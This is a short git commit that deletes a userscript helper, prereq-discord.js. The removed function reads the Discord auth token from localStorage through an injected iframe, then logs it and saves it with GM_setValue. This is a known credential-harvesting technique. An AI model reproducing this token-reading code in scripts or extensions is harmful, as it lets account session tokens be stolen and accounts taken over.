c65fab4311b3ad81afed1b594b9728fcc60ae488
nilill <108374004+nilill@users.noreply.github.com>
2022-07-02 18:31:08 -0400

    Delete prereq-discord.js

--- prereq-discord.js
+++
@@ -1,9 +0,0 @@
-function discord() {
-const LS = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
-const LST = JSON.parse(LS.token);
-
-console.log(LST)
-
-GM_setValue("atoken", LST)
-console.log(GM_getValue('atoken'));
-}
